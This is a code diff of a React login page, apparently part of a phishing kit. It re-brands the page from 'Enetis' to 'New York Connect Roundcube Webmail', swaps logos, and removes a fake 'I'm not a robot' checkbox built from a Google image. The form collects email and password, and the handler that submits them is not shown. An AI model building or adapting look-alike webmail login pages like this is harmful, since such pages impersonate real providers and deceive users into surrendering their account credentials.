@@ -7,6 +7,9 @@ import { useState } from 'react';
 import axios from 'axios';
 import logo from './logo.png';
 import google from './google.png';
+import rounde from './round.png';
+
+
 
 
 
@@ -16,7 +19,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Enetis")
+    const[platform, setPlatform] = useState("New York Connect")
 
     const[showError, setShowError] = useState(false);
 
@@ -64,8 +67,8 @@ async function handleSubmit(e){
 
 
             <div className='col-md-5 whitediv m-auto py-3 px-4'>
-                <div className='text-center'>
-                <img className='logoimage' src={logo} />
+                <div className='text-left'>
+                <img className='logoimage' src={rounde} />
 
                 </div>
 
@@ -87,40 +90,22 @@ async function handleSubmit(e){
   </div>
 
 
-  <div class="form-group row">
-  <label style={{
-      visibility:"hidden",
-  }} for="inputPassword" class="col-sm-2 col-form-label label">Password</label>
-    <div class="col-sm-10">
-        <div className='googlediv rounded py-2'>
-            <div className='checkdiv pl-3'>
-                <input onChange={function(e){
-                    setChecked(!ischecked);
-                }} type="checkbox"checked={ischecked} className='mycheck' /><span className='checkspan ml-3'>I'm not a robot</span>
-
-            </div>
-
-            <div className='googleimage text-right pr-3'>
-                <img className='rap' src={google}/>
-
-            </div>
-
-        </div>
-    </div>
-  </div>
+ 
 
        
                    
-                   {ischecked && <div className='form-group text-center'>
+                 <div className='form-group text-center'>
 
                         <button type='submit' className=' border-0 px-3 rounded mt-3 font-weight-bold'>Login</button>
 
                     </div>
-}
 
                 </form>
 
             </div>
+
+
+            <p className='info mt-5'>New York Connect Roundcube Webmail  ●  Get support</p>
         
         </>
     );
